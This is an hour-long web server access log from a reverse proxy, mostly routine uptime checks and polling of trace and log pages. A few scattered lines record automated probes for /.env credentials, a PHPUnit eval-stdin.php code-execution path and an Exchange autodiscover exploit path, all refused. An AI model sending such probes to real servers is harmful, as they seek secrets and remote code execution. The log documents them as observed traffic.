173.48.140.140 - - [19/Dec/2023:02:48:38 +0000] "GET /trace/pollping.php?id=fmo2yglzi HTTP/2.0" 200 107 "-" "-" 7486 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [19/Dec/2023:02:48:38 +0000] "GET /trace/polltrace.php?id=7tw9a0mry HTTP/2.0" 200 301 "-" "-" 7487 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:02:48:39 +0000] "GET /trace/pollping.php?id=fmo2yglzi HTTP/2.0" 200 131 "-" "-" 7488 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:02:48:39 +0000] "GET /trace/polltrace.php?id=7tw9a0mry HTTP/2.0" 200 301 "-" "-" 7489 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:02:48:40 +0000] "GET /trace/pollping.php?id=fmo2yglzi HTTP/2.0" 200 153 "-" "-" 7490 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:02:48:40 +0000] "GET /trace/polltrace.php?id=7tw9a0mry HTTP/2.0" 200 301 "-" "-" 7491 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:02:48:41 +0000] "GET /trace/pollping.php?id=fmo2yglzi HTTP/2.0" 200 176 "-" "-" 7492 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:02:48:41 +0000] "GET /trace/polltrace.php?id=7tw9a0mry HTTP/2.0" 200 341 "-" "-" 7493 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:02:48:42 +0000] "GET /trace/pollping.php?id=fmo2yglzi HTTP/2.0" 200 191 "-" "-" 7494 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [19/Dec/2023:02:48:42 +0000] "GET /trace/polltrace.php?id=7tw9a0mry HTTP/2.0" 200 341 "-" "-" 7495 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:02:48:42 +0000] "GET /trace/cleanping.php?id=fmo2yglzi HTTP/2.0" 200 71 "-" "-" 7496 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:02:48:43 +0000] "GET /trace/polltrace.php?id=7tw9a0mry HTTP/2.0" 200 381 "-" "-" 7497 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:02:48:44 +0000] "GET /trace/polltrace.php?id=7tw9a0mry HTTP/2.0" 200 381 "-" "-" 7498 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:02:48:45 +0000] "GET /trace/polltrace.php?id=7tw9a0mry HTTP/2.0" 200 381 "-" "-" 7499 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:02:48:46 +0000] "GET /trace/polltrace.php?id=7tw9a0mry HTTP/2.0" 200 565 "-" "-" 7500 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:02:48:46 +0000] "GET /trace/cleantrace.php?id=7tw9a0mry HTTP/2.0" 200 72 "-" "-" 7501 "livetrace@docker" "http://172.18.0.3:80" 3ms
159.203.109.206 - - [19/Dec/2023:02:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7502 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7503 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7504 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7505 "www@docker" "http://172.18.0.9:80" 0ms
193.111.248.5 - - [19/Dec/2023:02:51:14 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 7506 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:02:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7507 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7508 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7509 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7510 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7511 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7512 "www@docker" "http://172.18.0.9:80" 1ms
31.172.80.202 - - [19/Dec/2023:02:54:20 +0000] "GET /smtp.txt HTTP/1.1" 404 19 "-" "-" 7513 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:02:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7514 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7515 "www@docker" "http://172.18.0.9:80" 2ms
185.236.231.100 - - [19/Dec/2023:02:55:12 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7516 "web-to-websecure@internal" "-" 0ms
185.236.231.100 - - [19/Dec/2023:02:55:13 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7517 "web-to-websecure@internal" "-" 0ms
185.236.231.100 - - [19/Dec/2023:02:55:13 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 7518 "-" "-" 0ms
185.236.231.100 - - [19/Dec/2023:02:55:14 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 7519 "-" "-" 0ms
185.236.231.100 - - [19/Dec/2023:02:55:17 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 17 "-" "-" 7520 "web-to-websecure@internal" "-" 0ms
185.236.231.100 - - [19/Dec/2023:02:55:17 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 19 "-" "-" 7521 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:02:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7522 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:02:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7523 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7524 "www@docker" "http://172.18.0.9:80" 30ms
167.71.120.76 - - [19/Dec/2023:02:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7525 "www@docker" "http://172.18.0.9:80" 21ms
159.203.109.206 - - [19/Dec/2023:02:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7526 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7527 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7528 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7529 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:02:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7530 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:02:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7531 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7532 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7533 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7534 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7535 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7536 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7537 "www@docker" "http://172.18.0.9:80" 0ms
31.172.80.202 - - [19/Dec/2023:03:03:09 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 7538 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:03:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7539 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7540 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:03:04:17 +0000] "GET /trace/ HTTP/2.0" 200 6089 "-" "-" 7541 "livetrace@docker" "http://172.18.0.3:80" 35ms
173.48.140.140 - - [19/Dec/2023:03:04:17 +0000] "GET /trace/styles.css?version=13 HTTP/2.0" 200 1423 "-" "-" 7542 "livetrace@docker" "http://172.18.0.3:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7543 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7544 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7545 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7546 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7547 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7548 "www@docker" "http://172.18.0.9:80" 1ms
57.129.23.166 - - [19/Dec/2023:03:07:08 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7549 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [19/Dec/2023:03:07:08 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7550 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:03:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7551 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7552 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7553 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7554 "www@docker" "http://172.18.0.9:80" 0ms
185.224.128.191 - - [19/Dec/2023:03:09:00 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7555 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:03:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7556 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7557 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7558 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7559 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7560 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7561 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7562 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7563 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7564 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7565 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7566 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7567 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7568 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7569 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7570 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7571 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7572 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7573 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7574 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7575 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7576 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7577 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7578 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7579 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7580 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7581 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7582 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7583 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:03:22:57 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7584 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:03:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7585 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7586 "www@docker" "http://172.18.0.9:80" 0ms
162.216.150.248 - - [19/Dec/2023:03:23:38 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7587 "web-to-websecure@internal" "-" 0ms
162.216.150.248 - - [19/Dec/2023:03:23:38 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7588 "-" "-" 0ms
143.110.222.166 - - [19/Dec/2023:03:24:11 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7589 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:03:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7590 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7591 "www@docker" "http://172.18.0.9:80" 0ms
107.170.252.53 - - [19/Dec/2023:03:25:06 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 19 "-" "-" 7592 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:03:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7593 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7594 "www@docker" "http://172.18.0.9:80" 0ms
171.4.239.37 - - [19/Dec/2023:03:26:12 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7595 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:03:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7596 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7597 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7598 "www@docker" "http://172.18.0.9:80" 0ms
69.164.217.245 - - [19/Dec/2023:03:27:28 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7599 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:03:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7600 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7601 "www@docker" "http://172.18.0.9:80" 0ms
69.164.217.245 - - [19/Dec/2023:03:28:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7602 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:03:28:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7603 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7604 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7605 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7606 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:30:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7607 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7608 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7609 "www@docker" "http://172.18.0.9:80" 0ms
45.33.80.243 - - [19/Dec/2023:03:32:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7610 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:03:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7611 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:32:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7612 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7613 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7614 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7615 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7616 "www@docker" "http://172.18.0.9:80" 0ms
45.79.181.104 - - [19/Dec/2023:03:35:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7617 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:03:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7618 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:35:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7619 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7620 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7621 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7622 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7623 "www@docker" "http://172.18.0.9:80" 6ms
159.203.109.206 - - [19/Dec/2023:03:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7624 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7625 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7626 "www@docker" "http://172.18.0.9:80" 18ms
167.71.120.76 - - [19/Dec/2023:03:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7627 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7628 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7629 "www@docker" "http://172.18.0.9:80" 3ms
159.203.109.206 - - [19/Dec/2023:03:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7630 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7631 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7632 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7633 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7634 "www@docker" "http://172.18.0.9:80" 26ms
167.71.120.76 - - [19/Dec/2023:03:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7635 "www@docker" "http://172.18.0.9:80" 6ms
159.203.109.206 - - [19/Dec/2023:03:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7636 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7637 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7638 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7639 "www@docker" "http://172.18.0.9:80" 1ms
198.235.24.161 - - [19/Dec/2023:03:46:02 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7640 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:03:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7641 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7642 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:03:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7643 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7644 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7645 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:03:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7646 "www@docker" "http://172.18.0.9:80" 80ms
159.203.109.206 - - [19/Dec/2023:03:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7647 "www@docker" "http://172.18.0.9:80" 41ms
167.71.120.76 - - [19/Dec/2023:03:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7648 "www@docker" "http://172.18.0.9:80" 3ms
159.203.109.206 - - [19/Dec/2023:03:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7649 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7650 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:03:51:10 +0000] "GET /logs/ HTTP/2.0" 200 1954 "-" "-" 7651 "www@docker" "http://172.18.0.9:80" 42ms
173.48.140.140 - - [19/Dec/2023:03:51:11 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 200 1641 "-" "-" 7652 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:03:51:14 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 7653 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7654 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7655 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:03:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7656 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:03:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7657 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:03:52:37 +0000] "GET /logs/ HTTP/2.0" 200 1956 "-" "-" 7658 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:03:52:37 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 7659 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:03:52:37 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4598 "-" "-" 7660 "www@docker" "http://172.18.0.9:80" 231ms
173.48.140.140 - - [19/Dec/2023:03:52:59 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 7661 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:03:52:59 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 4548 "-" "-" 7662 "www@docker" "http://172.18.0.9:80" 48ms
159.203.109.206 - - [19/Dec/2023:03:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7663 "www@docker" "http://172.18.0.9:80" 1ms
